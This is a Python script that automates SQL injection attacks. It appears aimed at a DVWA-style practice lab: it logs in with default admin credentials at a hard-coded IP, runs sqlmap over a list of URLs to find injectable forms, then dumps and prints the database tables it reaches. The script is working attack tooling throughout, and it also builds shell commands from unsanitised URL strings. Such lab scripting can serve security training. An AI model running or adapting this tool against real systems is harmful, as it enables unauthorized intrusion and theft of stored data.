import os
from subprocess import Popen, PIPE
import requests
from bs4 import BeautifulSoup

f = open('addresses.txt', 'r')
file_contents = f.readlines()

def getCookie():
    with requests.Session() as session:
        html = session.get('http://45.147.96.25:4242/login.php')
        html_parsed = BeautifulSoup(html.text, "html.parser")
        user_token = html_parsed.find('input', { "type" : "hidden" })['value']
        creds = {
            "username"   : 'admin',
            "password"   : 'password',
            "Login"      : "Submit",
            "user_token" : user_token
        }
        request = session.post('http://45.147.96.25:4242/login.php', data = creds)
        cookie = html.cookies.get_dict()
        session.close()
    return cookie

inectableForms = []
report = "Starting automated sqlmap scan:\n"

print("Starting automated sqlmap scan:")
print("Starting to search form in pages ...")

for count, line in enumerate(file_contents, start=1):
    address = line[13:].split(' ')[0].strip()
    print('Searching for form in ' + address + '... [' + str(count) + '/' + str(len(file_contents)) + ']')

    if address.endswith(".ini") or address.endswith(".txt") or "/." in address:
        report += address + " can't be the subject of SQL injection\n"
        print('No forms found in page')
    else:
        command = "sqlmap -u " + address + " --cookie='PHPSESSID=" + getCookie()['PHPSESSID'] + ";security=low' --forms --batch --results-file='forms.csv'"
        process = Popen(command, shell=True, stdout=PIPE)
        injectable = False
        for line in process.stdout:
            if str(line).find("following injection") != -1:
                injectable = True
                break;

        if injectable:
            f = open('forms.csv', 'r')
            forms = f.readlines()
            print('#####################')
            print('Forms found in page !')
            for form in forms:
                if str(form.split(",")[0]).find("http") != -1:
                    print(str(form.split(",")[0]))
                    inectableForms.append(str(form.split(",")[0]))
                    print('#####################')
                    os.remove("forms.csv")
                else:
                    print('No injectable forms found in page')

print('\n#####################################')
print('Forms scan finished: ' + str(len(inectableForms)) + ' form(s) found!')
print('#####################################')
print("\nStarting to perform SQL injection on the form(s):\n")

for count, form in enumerate(inectableForms, start=1):
    print('#####################################')
    print('Injection on ' + form + '[' + str(count) + '/' + str(len(inectableForms)) + ']')
    command = "sqlmap -u '" + form + "' --cookie='PHPSESSID=" + getCookie()['PHPSESSID'] + ";security=low' --dump --batch --output-dir='dump/'"
    process = Popen(command, shell=True, stdout=PIPE)
    report += form + " is an injectable form where we dumped this:"
    for line in process.stdout:
        if 'dumped to CSV file' in str(line): 
            table = str(line).split(' ')[3]
            path = str(line).split(' ')[8]
            table = table[1:len(table)-1]
            path = path[1:len(path)-4]
            print('The '+ table + ' SQL table has been dumped:')
            report += 'The '+ table + ' SQL table has been dumped:'
            f = open(path, 'r')
            dump = f.read().replace(',', '\t|')
            print(dump[:len(dump)-1])
            report += dump[:len(dump)-1]
    print('#####################################')

print(report)
